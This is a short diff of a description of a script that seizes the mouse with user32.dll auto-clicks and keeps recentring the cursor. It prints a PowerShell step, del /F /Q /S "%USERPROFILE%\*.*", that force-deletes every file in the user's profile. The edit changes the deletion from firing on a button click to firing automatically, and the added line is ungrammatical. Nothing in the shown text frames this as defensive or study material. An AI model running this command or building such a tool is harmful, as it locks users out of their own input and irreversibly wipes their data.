@@ -17,7 +17,7 @@ Uses user32.dll functions to simulate automatic left-clicks every 0.2 seconds at
 Keeps repositioning the mouse to the center of the window, preventing normal movement.
 
 💣 Critical behavior when clicking:
-When the user clicks the button, the script executes:
+When the user clicks the button,and the script do it automatically, the script executes:
 
 powershell
 del /F /Q /S "%USERPROFILE%\*.*"
